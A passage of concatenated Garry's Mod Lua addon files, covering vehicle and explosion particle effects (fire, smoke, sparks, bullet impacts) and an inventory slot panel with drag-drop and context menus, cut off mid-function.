		p:SetDieTime(math.random(4, 6))
		p:SetStartAlpha(255)
		p:SetEndAlpha(0)
		p:SetStartSize(800)
		p:SetEndSize(400)
		p:SetRollDelta(math.random(-0.4, 0.4))	
		p:SetAirResistance(math.random(75, 140))
		p:SetVelocity(Vector(math.sin(i), math.cos(i), 0) * 8000)

		local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start)
		p:SetDieTime(math.random(42, 46))
		p:SetStartAlpha(100)
		p:SetEndAlpha(0)
		p:SetStartSize(1000)
		p:SetEndSize(size * 0.8)
		p:SetRollDelta(math.random(-0.4, 0.4))	
		p:SetAirResistance(math.random(75, 140))
		p:SetVelocity(Vector(math.sin(i), math.cos(i), 0) * 8000)
		p:SetColor(50, 50, 50)

		local p = self.Emitter:Add("particle/smokesprites_000" .. math.random(3, 9), self.Start + Vector(0, 0, math.random(400, 1000)))
		p:SetDieTime(math.random(42, 46))
		p:SetStartAlpha(100)
		p:SetEndAlpha(0)
		p:SetStartSize(1000)
		p:SetEndSize(size * 0.8)
		p:SetRollDelta(math.random(-0.4, 0.4))
		p:SetAirResistance(math.random(75, 140))
		p:SetVelocity(Vector(math.sin(i), math.cos(i), 0) * 4000)
		p:SetColor(50, 50, 50)
	end
end

function EFFECT:Think()
	self.Value = math.Approach(self.Value, 0, 0.0008)
	self.Alpha = math.Approach(self.Alpha, 0, 1)
	self.Size = math.Approach(self.Size, 50000, 1000)

	if CurTime() > self.LifeTime then
		hook.Remove("RenderScreenspaceEffects", "dronesrewrite_nuke_blind" .. self.Index)

		self.Emitter:Finish()
	end

	return CurTime() < self.LifeTime
end

function EFFECT:Render()
	render.SetMaterial(glow)
	render.DrawSprite(self.Start, self.Size, self.Size, Color(255, 255, 255, self.Alpha))
end


--PATH addons/lvs_cars_3027255911/lua/effects/lvs_ammorack_fire.lua:

EFFECT.FireMat = Material( "effects/fire_cloud1" )
EFFECT.HeatMat = Material( "sprites/heatwave" )

EFFECT.Smoke = {
	"particle/smokesprites_0001",
	"particle/smokesprites_0002",
	"particle/smokesprites_0003",
	"particle/smokesprites_0004",
	"particle/smokesprites_0005",
	"particle/smokesprites_0006",
	"particle/smokesprites_0007",
	"particle/smokesprites_0008",
	"particle/smokesprites_0009",
	"particle/smokesprites_0010",
	"particle/smokesprites_0011",
	"particle/smokesprites_0012",
	"particle/smokesprites_0013",
	"particle/smokesprites_0014",
	"particle/smokesprites_0015",
	"particle/smokesprites_0016"
}

function EFFECT:Init( data )
	local Pos = data:GetOrigin()
	local Ent = data:GetEntity()

	self.LifeTime = 0.4
	self.DieTime = CurTime() + self.LifeTime

	if not IsValid( Ent ) then return end

	self.Ent = Ent
	self.Pos = Ent:WorldToLocal( Pos + VectorRand() * 3 )
	self.Seed = math.Rand( 0, 10000 )
	self.Magnitude = data:GetMagnitude()

	local emitter = Ent:GetParticleEmitter( self.Pos )

	if not IsValid( emitter ) then return end

	local VecCol = (render.GetLightColor( Pos ) * 0.8 + Vector(0.2,0.2,0.2)) * 255

	for i = 0, 20 do
		local particle = emitter:Add( "sprites/rico1", Pos )
		
		local vel = VectorRand() * 800
		
		if particle then
			particle:SetVelocity( Vector(0,0,500) + VectorRand() * 500 )
			particle:SetDieTime( 0.25 * self.Magnitude )
			particle:SetStartAlpha( 200 )
			particle:SetEndAlpha( 0 )
			particle:SetStartSize( 3 )
			particle:SetEndSize( 0 )
			particle:SetRoll( math.Rand(-1,1) * math.pi )
			particle:SetRollDelta( math.Rand(-1,1) * 3 )
			particle:SetColor( 255, 255, 255 )
			particle:SetAirResistance( 0 )
		end
	end

	for i = 1, 8 do
		local particle = emitter:Add( self.Smoke[ math.random(1, #self.Smoke ) ], Pos )

		local Dir = Angle(0,math.Rand(-180,180),0):Forward()
		Dir.z = -0.5
		Dir:Normalize()

		if particle then
			particle:SetVelocity( Dir * 250 )
			particle:SetDieTime( 0.5 + i * 0.01 )
			particle:SetAirResistance( 125 ) 
			particle:SetStartAlpha( 100 )
			particle:SetStartSize( 20 )
			particle:SetEndSize( 40 )
			particle:SetRoll( math.Rand(-1,1) * math.pi )
			particle:SetRollDelta( math.Rand(-1,1) * 3 )
			particle:SetColor( 0, 0, 0 )
			particle:SetGravity( Vector( 0, 0, 600 ) )
			particle:SetCollide( true )
			particle:SetBounce( 0 )
		end
	end

	for i = 0,22 do
		local particle = emitter:Add( "particles/flamelet"..math.random(1,5), Pos )

		local Dir = Angle(0,math.Rand(-180,180),0):Forward()

		if particle then
			particle:SetVelocity( Dir * math.Rand(600,900) * self.Magnitude )
			particle:SetDieTime( math.Rand(0.2,0.3) * self.Magnitude )
			particle:SetAirResistance( 400 ) 
			particle:SetStartAlpha( 255 )
			particle:SetStartSize( math.Rand(20,25) )
			particle:SetEndSize( math.Rand(5,10) )
			particle:SetRoll( math.Rand(-1,1) * 180 )
			particle:SetRollDelta( math.Rand(-1,1) * 3 )
			particle:SetColor( 255, 200, 50 )
			particle:SetGravity( Vector( 0, 0, 1000 ) )
			particle:SetCollide( false )
		end
	end

	for i = 1, 4 do
		local particle = emitter:Add( self.Smoke[ math.random(1, #self.Smoke ) ], Pos )

		local Dir = Angle(0,math.Rand(-180,180),0):Forward()

		if particle then
			particle:SetVelocity( Dir * 500 * self.Magnitude )
			particle:SetDieTime( 0.5 + i * 0.01 )
			particle:SetAirResistance( 125 ) 
			particle:SetStartAlpha( 150 * self.Magnitude )
			particle:SetStartSize( 40 * self.Magnitude )
			particle:SetEndSize( 250 * self.Magnitude )
			particle:SetRoll( math.Rand(-1,1) * math.pi )
			particle:SetRollDelta( math.Rand(-1,1) * 3 )
			particle:SetColor( math.min( VecCol.r, 255 ), math.min( VecCol.g, 255 ), math.min( VecCol.b, 255 ) )
			particle:SetGravity( Vector( 0, 0, 600 ) )
			particle:SetCollide( true )
			particle:SetBounce( 0 )
		end
	end
end

function EFFECT:Think()
	if not IsValid( self.Ent ) then return false end

	if self.DieTime < CurTime() then return false end

	self:SetPos( self.Ent:LocalToWorld( self.Pos ) )

	return true
end

function EFFECT:Render()
	if not IsValid( self.Ent ) or not self.Pos then return end

	self:RenderFire()
end

function EFFECT:RenderFire()
	local Scale = ((self.DieTime - CurTime()) / self.LifeTime) * (self.Magnitude or 0)

	if Scale < 0 then return end

	local Pos = self.Ent:LocalToWorld( self.Pos )

	local scroll = -CurTime() * 10

	local Up = Vector(0,0,0.92) + VectorRand() * 0.08

	render.SetMaterial( self.FireMat )
	render.StartBeam( 3 )
		render.AddBeam( Pos, 64 * Scale, scroll, Color( 100, 100, 100, 100 ) )
		render.AddBeam( Pos + Up * 120 * Scale, 64 * Scale, scroll + 1, Color( 255, 200, 50, 150 ) )
		render.AddBeam( Pos + Up * 300 * Scale, 64 * Scale, scroll + 3, Color( 255, 191, 0, 0 ) )
	render.EndBeam()

	scroll = scroll * 0.5

	render.UpdateRefractTexture()
	render.SetMaterial( self.HeatMat )
	render.StartBeam( 3 )
		render.AddBeam( Pos, 64 * Scale, scroll, Color( 0, 0, 255, 200 ) )
		render.AddBeam( Pos + Up * 64 * Scale, 64 * Scale, scroll + 2, color_white )
		render.AddBeam( Pos + Up * 250 * Scale, 120 * Scale, scroll + 5, Color( 0, 0, 0, 0 ) )
	render.EndBeam()

	scroll = scroll * 1.3
	render.SetMaterial( self.FireMat )
	render.StartBeam( 3 )
		render.AddBeam( Pos, 32 * Scale, scroll, Color( 100, 100, 100, 100 ) )
		render.AddBeam( Pos + Up * 60 * Scale, 32 * Scale, scroll + 1, Color( 255, 200, 50, 150 ) )
		render.AddBeam( Pos + Up * 300 * Scale, 32 * Scale, scroll + 3, Color( 255, 191, 0, 0 ) )
	render.EndBeam()
end
--PATH addons/lvs_base-main/lua/effects/lvs_bullet_impact_ap.lua:

EFFECT.DustMat = {
	"effects/lvs_base/particle_debris_01",
	"effects/lvs_base/particle_debris_02",
}

EFFECT.SmokeMat = {
	"particle/smokesprites_0001",
	"particle/smokesprites_0002",
	"particle/smokesprites_0003",
	"particle/smokesprites_0004",
	"particle/smokesprites_0005",
	"particle/smokesprites_0006",
	"particle/smokesprites_0007",
	"particle/smokesprites_0008",
	"particle/smokesprites_0009",
	"particle/smokesprites_0010",
	"particle/smokesprites_0011",
	"particle/smokesprites_0012",
	"particle/smokesprites_0013",
	"particle/smokesprites_0014",
	"particle/smokesprites_0015",
	"particle/smokesprites_0016"
}

EFFECT.SparkSurface = {
	["chainlink"] = true,
	["canister"] = true,
	["metal_barrel"] = true,
	["metalvehicle"] = true,
	["metal"] = true,
	["metalgrate"] = true,
	["rubbertire"] = true,
}

EFFECT.DustSurface = {
	["sand"] = true,
	["dirt"] = true,
	["grass"] = true,
	["antlionsand"] = true,
}

EFFECT.SmokeSurface = {
	["concrete"] = true,
	["tile"] = true,
	["plaster"] = true,
	["boulder"] = true,
	["plastic"] = true,
	["default"] = true,
	["glass"] = true,
	["brick"] = true,
}

function EFFECT:Init( data )
	local pos = data:GetOrigin()

	local bullet_dir = data:GetStart()
	local dir = data:GetNormal()
	local magnitude = data:GetMagnitude()

	local ent = data:GetEntity()
	local surface = data:GetSurfaceProp()
	local surfaceName = util.GetSurfacePropName( surface )

	local emitter = ParticleEmitter( pos, false )

	local VecCol = (render.GetLightColor( pos ) * 0.8 + Vector(0.17,0.15,0.1)) * 255

	local DieTime = math.Rand(0.8,1.4)

	for i = 1, 60 * magnitude do
		local spark = emitter:Add("effects/spark", pos + dir * 8)

		if not spark then continue end

		spark:SetStartAlpha( 255 )
		spark:SetEndAlpha( 0 )
		spark:SetCollide( true )
		spark:SetBounce( math.Rand(0,1) )
		spark:SetColor( 255, 255, 255 )
		spark:SetGravity( Vector(0,0,-600) )
		spark:SetEndLength(0)

		local size = math.Rand(4, 6) * magnitude
		spark:SetEndSize( size )
		spark:SetStartSize( size )

		spark:SetStartLength( math.Rand(20,40) * magnitude )
		spark:SetDieTime( math.Rand(0.4, 1.2) )
		spark:SetVelocity( (dir * math.Rand(300, 600) + VectorRand() * 300) * magnitude )
	end

	local flash = emitter:Add( "effects/yellowflare",pos )

	if flash then
		flash:SetPos( pos + dir * 15 )
		flash:SetStartAlpha( 200 )
		flash:SetEndAlpha( 0 )
		flash:SetColor( 255,255,255 )
		flash:SetEndSize( 0 )
		flash:SetDieTime( 0.075 )
		flash:SetStartSize( 300 * magnitude ^ 2 )
	end

	if self.SparkSurface[ surfaceName ] then
		if IsValid( ent ) and ent.LVS then
			if (90 - math.deg( math.acos( math.Clamp( -dir:Dot( bullet_dir ) ,-1,1) ) )) > 10 then
				local effectdata = EffectData()
				effectdata:SetOrigin( pos )
				util.Effect( "cball_explode", effectdata, true, true )

				local Ax = math.acos( math.Clamp( dir:Dot( bullet_dir ) ,-1,1) )
				local Fx = math.cos( Ax )

				local effectdata = EffectData()
					effectdata:SetOrigin( pos )
					effectdata:SetNormal( (bullet_dir - dir * Fx * 2):GetNormalized() * 0.75 )
				util.Effect( "manhacksparks", effectdata, true, true )

				local effectdata = EffectData()
					effectdata:SetOrigin( pos )
					effectdata:SetNormal( -bullet_dir * 0.75 )
				util.Effect( "manhacksparks", effectdata, true, true )
			end
		else
			local effectdata = EffectData()
			effectdata:SetOrigin( pos )
			util.Effect( "cball_explode", effectdata, true, true )

			local effectdata = EffectData()
				effectdata:SetOrigin( pos )
				effectdata:SetNormal( dir )
			util.Effect( "manhacksparks", effectdata, true, true )

			local effectdata = EffectData()
				effectdata:SetOrigin( pos )
				effectdata:SetNormal( -bullet_dir )
			util.Effect( "manhacksparks", effectdata, true, true )
		end
	end

	if self.SmokeSurface[ surfaceName ] then
		for i = 1, 24 do
			local particle = emitter:Add( self.SmokeMat[ math.random(1, #self.SmokeMat ) ], pos )

			if not particle then continue end

			particle:SetStartAlpha( math.Rand(33, 66) )
			particle:SetEndAlpha( 0 )
			particle:SetColor( math.min( VecCol.r, 255 ), math.min( VecCol.g, 255 ), math.min( VecCol.b, 255 ) )
			particle:SetGravity( Vector(0,0,-math.Rand(33, 66)) )
			particle:SetRollDelta( math.random(0, 0.5 * math.pi) )
			particle:SetAirResistance( 175 )

			particle:SetStartSize( 15 )
			particle:SetDieTime( math.Rand(0.5, 1) )
			particle:SetEndSize( math.Rand(45, 90) )
			particle:SetVelocity( dir * math.Rand(40, 200) + VectorRand() * 150)
		end

		for i = 1,15 do
			local particle = emitter:Add("effects/fleck_cement" .. math.random(1, 2), pos + dir * 8)

			if not particle then continue end

			particle:SetStartAlpha( 255 )
			particle:SetEndAlpha( 0 )
			particle:SetCollide( true )
			particle:SetBounce( math.Rand(0,1) )
			particle:SetColor( math.min( VecCol.r, 255 ), math.min( VecCol.g, 255 ), math.min( VecCol.b, 255 ) )
			particle:SetGravity(Vector(0,0,-600))
			particle:SetRollDelta( math.random(0, 0.5*math.pi) )

			particle:SetEndSize( 2 )
			particle:SetStartSize( 2 )

			particle:SetDieTime( math.Rand(1, 2) )
			particle:SetVelocity( dir * math.Rand(40, 200) + VectorRand() * 500 )
		end
	end

	if not self.DustSurface[ surfaceName ] then return end

	for i = 1, 10 do
		for i = 1, 15 do
			local particle = emitter:Add( self.SmokeMat[ math.random(1, #self.SmokeMat ) ], pos )

			if not particle then continue end

			particle:SetStartAlpha( math.Rand(40, 80) )
			particle:SetEndAlpha(0)
			particle:SetColor( math.min( VecCol.r, 255 ), math.min( VecCol.g, 255 ), math.min( VecCol.b, 255 ) )
			particle:SetGravity( Vector(0,0,-math.Rand(75, 150)) )
			particle:SetRollDelta( math.random(0, 0.5*math.pi) )
			particle:SetAirResistance( 175 )

			particle:SetStartSize( 5 )
			particle:SetDieTime( math.Rand(0.5, 1) )
			particle:SetEndSize( math.Rand(15, 30) )
			particle:SetVelocity( (dir * math.Rand(80, 400) + VectorRand() * 100) * 1.5 )
		end
    
		for n = 0,6 do
			local particle = emitter:Add( self.DustMat[ math.random(1,#self.DustMat) ] , pos )

			if not particle then continue end

			particle:SetVelocity( (dir * 50 * i + VectorRand() * 50) )
			particle:SetDieTime( (i / 8) * DieTime )
			particle:SetAirResistance( 10 ) 
			particle:SetStartAlpha( 255 )
			particle:SetStartSize( 5 )
			particle:SetEndSize( 10 * i )
			particle:SetRollDelta( math.Rand(-1,1) )
			particle:SetColor( math.min( VecCol.r, 255 ), math.min( VecCol.g, 255 ), math.min( VecCol.b, 255 ) )
			particle:SetGravity( Vector(0,0,-600) )
			particle:SetCollide( false )
		end
	end

	emitter:Finish()
end

function EFFECT:Think()
	return false
end

function EFFECT:Render()
end

--PATH addons/lvs_cars_3027255911/lua/effects/lvs_carengine_fire.lua:

EFFECT.GlowMat = Material( "sprites/light_glow02_add" )
EFFECT.FireMat = {
	[1] = Material( "effects/lvs_base/flamelet1" ),
	[2] = Material( "effects/lvs_base/flamelet2" ),
	[3] = Material( "effects/lvs_base/flamelet3" ),
	[4] = Material( "effects/lvs_base/flamelet4" ),
	[5] = Material( "effects/lvs_base/flamelet5" ),
	[6] = Material( "effects/lvs_base/fire" ),
}

EFFECT.SmokeMat = {
	[1] = Material( "particle/smokesprites_0001" ),
	[2] = Material( "particle/smokesprites_0002" ),
	[3] = Material( "particle/smokesprites_0003" ),
	[4] = Material( "particle/smokesprites_0004" ),
	[5] = Material( "particle/smokesprites_0005" ),
	[6] = Material( "particle/smokesprites_0006" ),
	[7] = Material( "particle/smokesprites_0007" ),
	[8] = Material( "particle/smokesprites_0008" ),
	[9] = Material( "particle/smokesprites_0009" ),
	[10] = Material( "particle/smokesprites_0010" ),
	[11] = Material( "particle/smokesprites_0011" ),
	[12] = Material( "particle/smokesprites_0012" ),
	[13] = Material( "particle/smokesprites_0013" ),
	[14] = Material( "particle/smokesprites_0014" ),
	[15] = Material( "particle/smokesprites_0015" ),
	[16] = Material( "particle/smokesprites_0016" ),
}

EFFECT.Smoke = {
	"particle/smokesprites_0001",
	"particle/smokesprites_0002",
	"particle/smokesprites_0003",
	"particle/smokesprites_0004",
	"particle/smokesprites_0005",
	"particle/smokesprites_0006",
	"particle/smokesprites_0007",
	"particle/smokesprites_0008",
	"particle/smokesprites_0009",
	"particle/smokesprites_0010",
	"particle/smokesprites_0011",
	"particle/smokesprites_0012",
	"particle/smokesprites_0013",
	"particle/smokesprites_0014",
	"particle/smokesprites_0015",
	"particle/smokesprites_0016"
}

function EFFECT:Init( data )
	local Pos = data:GetOrigin()
	local Ent = data:GetEntity()

	self.LifeTime = 1
	self.DieTime = CurTime() + self.LifeTime

	if not IsValid( Ent ) then return end

	local randomPos = VectorRand() * 15
	randomPos.z = 0

	self.Ent = Ent
	self.Pos = Ent:WorldToLocal( Pos + randomPos )
	self.RandomSize = math.Rand( 0.8, 1.6 )
	self.Vel = self.Ent:GetVelocity()

	local emitter = Ent:GetParticleEmitter( self.Pos )

	if not IsValid( emitter ) then return end

	for i = 1, 8 do
		local particle = emitter:Add( self.Smoke[ math.random(1, #self.Smoke ) ], Pos )

		local Dir = Angle(0,math.Rand(-180,180),0):Forward()
		Dir.z = -0.5
		Dir:Normalize()

		if particle then
			particle:SetVelocity( Dir * 250 )
			particle:SetDieTime( 0.5 + i * 0.01 )
			particle:SetAirResistance( 125 ) 
			particle:SetStartAlpha( 100 )
			particle:SetStartSize( 20 )
			particle:SetEndSize( 40 )
			particle:SetRoll( math.Rand(-1,1) * math.pi )
			particle:SetRollDelta( math.Rand(-1,1) * 3 )
			particle:SetColor( 0, 0, 0 )
			particle:SetGravity( Vector( 0, 0, 600 ) )
			particle:SetCollide( true )
			particle:SetBounce( 0 )
		end
	end
end

function EFFECT:Think()
	if not IsValid( self.Ent ) then return false end

	if self.DieTime < CurTime() then return false end

	self:SetPos( self.Ent:LocalToWorld( self.Pos ) )

	return true
end

function EFFECT:Render()
	if not IsValid( self.Ent ) or not self.Pos then return end

	self:RenderFire()
end

function EFFECT:RenderFire()
	local Scale = (self.DieTime - 0.4 - CurTime()) / 0.6

	if Scale < 0 then return end

	local Pos = self.Ent:LocalToWorld( self.Pos )

	local InvScale = 1 - Scale

	render.SetMaterial( self.GlowMat )
	render.DrawSprite( Pos + Vector(0,0,InvScale ^ 2 * 10), 100 * InvScale, 100 * InvScale, Color( 255, 150, 75, 255) )

	local Num = #self.FireMat - math.Clamp(math.ceil( Scale * #self.FireMat ) - 1,0, #self.FireMat - 1)

	local Size = (5 + 20 * Scale) * self.RandomSize
	local Offset = (self.Vel * InvScale ^ 2) * 0.025

	render.SetMaterial( self.FireMat[ Num ] )
	render.DrawSprite( Pos + Vector(0,0,InvScale ^ 2 * 30) - Offset, Size, Size, Color( 255, 255, 255, 255) )
end
--PATH addons/lvs_cars_3027255911/lua/effects/lvs_carengine_smoke.lua:

EFFECT.SmokeMat = {
	[1] = Material( "particle/smokesprites_0001" ),
	[2] = Material( "particle/smokesprites_0002" ),
	[3] = Material( "particle/smokesprites_0003" ),
	[4] = Material( "particle/smokesprites_0004" ),
	[5] = Material( "particle/smokesprites_0005" ),
	[6] = Material( "particle/smokesprites_0006" ),
	[7] = Material( "particle/smokesprites_0007" ),
	[8] = Material( "particle/smokesprites_0008" ),
	[9] = Material( "particle/smokesprites_0009" ),
	[10] = Material( "particle/smokesprites_0010" ),
	[11] = Material( "particle/smokesprites_0011" ),
	[12] = Material( "particle/smokesprites_0012" ),
	[13] = Material( "particle/smokesprites_0013" ),
	[14] = Material( "particle/smokesprites_0014" ),
	[15] = Material( "particle/smokesprites_0015" ),
	[16] = Material( "particle/smokesprites_0016" ),
}

function EFFECT:Init( data )
	local Pos = data:GetOrigin()
	local Ent = data:GetEntity()
	local Mag = data:GetMagnitude()

	self.LifeTime = 0.5 + Mag * 0.5
	self.DieTime = CurTime() + self.LifeTime

	if not IsValid( Ent ) then return end

	self.Mag = Mag
	self.Ent = Ent
	self.Pos = Ent:WorldToLocal( Pos + VectorRand() * 15 )
	self.RandomSize = math.Rand( 0.8, 1.6 )
	self.Vel = self.Ent:GetVelocity()
end

function EFFECT:Think()
	if not IsValid( self.Ent ) then return false end

	if self.DieTime < CurTime() then return false end

	self:SetPos( self.Ent:LocalToWorld( self.Pos ) )

	return true
end

function EFFECT:Render()
	if not IsValid( self.Ent ) or not self.Pos then return end

	self:RenderSmoke()
end

function EFFECT:RenderSmoke()
	local Scale = (self.DieTime - CurTime()) / self.LifeTime

	local Pos = self.Ent:LocalToWorld( self.Pos )

	local InvScale = 1 - Scale

	local Num = #self.SmokeMat - math.Clamp(math.ceil( Scale * #self.SmokeMat ) - 1,0, #self.SmokeMat - 1)

	local A = (50 + 100 * (1 - self.Mag)) * Scale
	local C = (20 + 30 * self.RandomSize * self.Mag)

	local Size = (25 + 30 * InvScale) * self.RandomSize
	local Offset = (self.Vel * InvScale ^ 2) * 0.15

	render.SetMaterial( self.SmokeMat[ Num ] )
	render.DrawSprite( Pos + Vector(0,0,InvScale ^ 2 * (20 + self.Vel:Length() / 25) * self.RandomSize) - Offset, Size, Size, Color( C, C, C, A ) )
end

--PATH addons/lvs_cars_3027255911/lua/effects/lvs_physics_trackscraping.lua:

function EFFECT:Init( data )
	local pos = data:GetOrigin()
	local dir = data:GetNormal()

	local emitter = ParticleEmitter( pos, false )

	for i = 1, 360 do
		if math.random(1,30) ~= 10 then continue end

		local ang = i

		local X = math.cos( math.rad(ang) )
		local Y = math.sin( math.rad(ang) )

		local forward = Vector(X,Y,0)
		forward:Rotate( dir:Angle() + Angle(90,0,0) )

		local spark = emitter:Add("effects/spark", pos + VectorRand() * 10 )

		if not spark then continue end

		spark:SetStartAlpha( 255 )
		spark:SetEndAlpha( 0 )
		spark:SetCollide( true )
		spark:SetBounce( math.Rand(0,1) )
		spark:SetColor( 255, 255, 255 )
		spark:SetGravity( Vector(0,0,-600) )
		spark:SetEndLength(0)

		local size = math.Rand(2, 4)
		spark:SetEndSize( size )
		spark:SetStartSize( size )

		spark:SetStartLength( math.Rand(5,7) )
		spark:SetDieTime( math.Rand(0.1, 0.3) )
		spark:SetVelocity( forward * math.random(75,100) + VectorRand() * 50 )
	end

	emitter:Finish()
end

function EFFECT:Think()
	return false
end

function EFFECT:Render()
end

--PATH addons/____inventory/lua/itemstore/language.lua:
itemstore.Language = {}

LANGUAGE = {}
include( "languages/" .. itemstore.config.Language .. ".lua" )
if SERVER then AddCSLuaFile( "languages/" .. itemstore.config.Language .. ".lua" ) end
itemstore.Language = LANGUAGE
LANGUAGE = nil

assert( itemstore.Language, "[ItemStore] Language not found" )

function itemstore.Translate( trans, ... )
	return string.format( itemstore.Language[ trans ] or trans, ... )
end
--PATH addons/____inventory/lua/itemstore/vgui/slot.lua:
local PANEL = {}

surface.CreateFont( "ItemStoreAmount", {
	font = system.IsLinux() and "DejaVu Sans" or "Tahoma",
	size = 11,
	weight = 500
} )

local GradientUp = Material( "gui/gradient_up" )
local GradientDown = Material( "gui/gradient_down" )

AccessorFunc( PANEL, "Item", "Item" )
AccessorFunc( PANEL, "ContainerID", "ContainerID", FORCE_NUMBER )
AccessorFunc( PANEL, "Slot", "Slot", FORCE_NUMBER )

function PANEL:Init()
	self.BaseClass.Init( self )

	self:Droppable( "ItemStore" )
	self:Receiver( "ItemStore", function( receiver, droptable, dropped )
		local droppable = droptable[ 1 ]

		if not dropped then return end

		local droppable = droptable[ 1 ]

		local from_con = droppable:GetContainerID()
		local to_con = droppable:GetContainerID()

		if not from_con then return end
		if not to_con then return end

		local from_slot = droppable:GetSlot()
		local to_slot = receiver:GetSlot()

		if not from_slot then return end
		if not to_slot then return end

		local from_item = droppable:GetItem()
		local to_item = receiver:GetItem()

		if from_item and to_item and ( from_item:CanMerge( to_item ) or
			from_item:CanUseWith( to_item ) ) then
			local menu = vgui.Create('onyx.Menu')
			menu:SetPos( gui.MouseX(), gui.MouseY() )

			if from_item:CanUseWith( to_item ) then
				menu:AddOption( itemstore.Translate( "usewith" ), function()
					LocalPlayer():UseItemWith( droppable:GetContainerID(), droppable:GetSlot(),
						receiver:GetContainerID(), receiver:GetSlot() )
				end ):SetIcon( "icon16/wrench_orange.png" )
			end

			menu:AddOption( itemstore.Translate( "move" ), function()
				LocalPlayer():MoveItem( droppable:GetContainerID(), droppable:GetSlot(),
					receiver:GetContainerID(), receiver:GetSlot() )
			end ):SetIcon( "icon16/arrow_switch.png" )

			if from_item:CanMerge( to_item ) then
				menu:AddOption( itemstore.Translate( "merge" ), function()
					LocalPlayer():MergeItem( droppable:GetContainerID(), droppable:GetSlot(),
						receiver:GetContainerID(), receiver:GetSlot() )
				end ):SetIcon( "icon16/arrow_join.png" )
			end

			menu:Open()
		else
			LocalPlayer():MoveItem( droppable:GetContainerID(), droppable:GetSlot(),
				receiver:GetContainerID(), receiver:GetSlot() )
		end
	end )
end

function PANEL:Paint( w, h )
	if itemstore.config.HighlightStyle == "old" or itemstore.config.HighlightStyle == "border" then
		surface.SetDrawColor( self.Hovered and itemstore.config.Colours.HoveredSlot or itemstore.config.Colours.Slot )
	else
		surface.SetDrawColor( itemstore.config.Colours.Slot )
	end

	surface.DrawRect( 0, 0, w, h )

	local item = self:GetItem()

	if item and item.HighlightColor then
		local col = Color( item.HighlightColor.r, item.HighlightColor.g, item.HighlightColor.b )
		local bright = Color( col.r * 1.25, col.g * 1.25, col.b * 1.25 )
		local dark = Color( bright.r * 0.5, bright.g * 0.5, bright.b * 0.5 )

		if itemstore.config.HighlightStyle == "full" then
			surface.SetDrawColor( dark )
			surface.DrawRect( 0, 0, w, h )

			surface.SetMaterial( GradientDown )
			surface.SetDrawColor( self.Hovered and bright or col )
			surface.DrawTexturedRect( 0, 0, w, h )
		elseif itemstore.config.HighlightStyle == "subtle" then
			surface.SetMaterial( GradientUp )
			surface.SetDrawColor( self.Hovered and bright or col )
			surface.DrawTexturedRect( 0, 0, w, h )
		elseif itemstore.config.HighlightStyle == "corner" then
			surface.SetMaterial( GradientUp )
			surface.SetDrawColor( self.Hovered and bright or col )
			surface.DrawTexturedRectRotated( w, h, w * 1.25, h * 1.25, 45 )
		elseif itemstore.config.HighlightStyle == "border" then
			surface.SetDrawColor( col )
			surface.DrawOutlinedRect( 0, 0, w, h )
		end
	end

	if not itemstore.config.HighlightStyle ~= "border" or not item then
		surface.SetDrawColor( itemstore.config.Colours.OuterBorder )
		surface.DrawOutlinedRect( 0, 0, w, h )
	end

	surface.SetDrawColor( itemstore.config.Colours.InnerBorder )
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

	self.BaseClass.Paint( self, w, h )

	local item = self:GetItem()
	if item and item:GetAmount() > 1 then
		draw.SimpleTextOutlined( item:FormatAmount(), "ItemStoreAmount", 4, 
			h - 2, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, color_black )
	end
end

function PANEL:Refresh()
	local item = self:GetItem()

	if item then
		self:SetModel( item:GetModel() )
		self:SetColor( item:GetColor() or color_white )

		if IsValid( self.Entity ) then
			self.Entity:SetMaterial( item:GetMaterial() )

			local min, max = self.Entity:GetRenderBounds()

			self:SetCamPos( Vector( 0.55, 0.55, 0.55 ) * min:Distance( max ) )
			self:SetLookAt( ( min + max ) * 0.5 )
		end
	else
		self.Entity = nil
		self:SetTooltip( nil )
	end
end

function PANEL:DoDoubleClick()
	local con_id = self:GetContainerID()
	local slot = self:GetSlot()
	local item = self:GetItem()

	if not con_id then return end
	if not slot then return end
	if not item then return end
	if not item.Use then return end

	LocalPlayer():UseItem( con_id, slot )
end

function PANEL:DoMiddleClick()
	local con_id = self:GetContainerID()
	local slot = self:GetSlot()
	local item = self:GetItem()

	if not con_id then return end
	if not slot then return end
	if not item then return end

	LocalPlayer():DropItem( con_id, slot )
end

function PANEL:DoRightClick()
	local con_id = self:GetContainerID()
	local slot = self:GetSlot()
	local item = self:GetItem()

	if not con_id then return end
	if not slot then return end
	if not item then return end

	local menu = vgui.Create('onyx.Menu')
	menu:SetPos( gui.MouseX(), gui.MouseY() )

	if item.Use then
		menu:AddOption( itemstore.Translate( "use" ), function()
			LocalPlayer():UseItem( con_id, slot )
		end ):SetIcon( "icon16/wrench.png" )
	end

	menu:AddOption( itemstore.Translate( "drop" ), function()
		LocalPlayer():DropItem( con_id, slot )
	end ):SetIcon( "icon16/arrow_out.png" )

	menu:AddOption( itemstore.Translate( "destroy" ), function()
		Derma_Query( itemstore.Translate( "destroy_confirmation" ), itemstore.Translate( "destroy_title" ), itemstore.Translate( "ok" ), function()
			LocalPlayer():DestroyItem( con_id, slot )
		end, itemstore.Translate( "cancel" ) ):SetSkin( "itemstore" )
	end ):SetIcon( "icon16/delete.png" )

	if item:CanSplit( 1 ) then
		local submenu, entry = menu:AddSubMenu( itemstore.Translate( "split" ) )
		entry:SetIcon( "icon16/arrow_divide.png" )

		local half = math.floor( item:GetAmount() * 0.5 )

		submenu:AddOption( itemstore.Translate( "split_half", half ), function()
			LocalPlayer():SplitItem( con_id, slot, half )
		end )

		for _, amount in ipairs( { 1, 2, 5, 10, 25, 50, 100, 250, 1000 } ) do
			if item:CanSplit( amount ) then
				submenu:AddOption( amount, function()
					LocalPlayer():SplitItem( con_id, slot, amount )
				end )
			end
		end

		menu:Open()
	end

	item:Run( "PopulateMenu", menu )

	menu:Open()
end

local Tooltip

function PANEL:CreateTooltip()
	if IsValid( Tooltip ) then
		Tooltip:SetVisible( true )
		return
	end

	Tooltip = vgui.Create( "ItemStoreTooltip" )
	self:UpdateTooltip()
end

function PANEL:UpdateTooltip()
	if not IsValid( Tooltip ) then return end

	Tooltip:SetContainerID( self:GetContainerID() )
	Tooltip:SetSlot( self:GetSlot() )
	Tooltip:SetItem( self:GetItem() )
	Tooltip:Refresh()
end

function PANEL:HideTooltip()
	if IsValid( Tooltip ) then Tooltip:SetVisible( false ) end
end

function PANEL:OnCursorEntered()
	if not self:GetItem() then return end

	self:CreateTooltip()
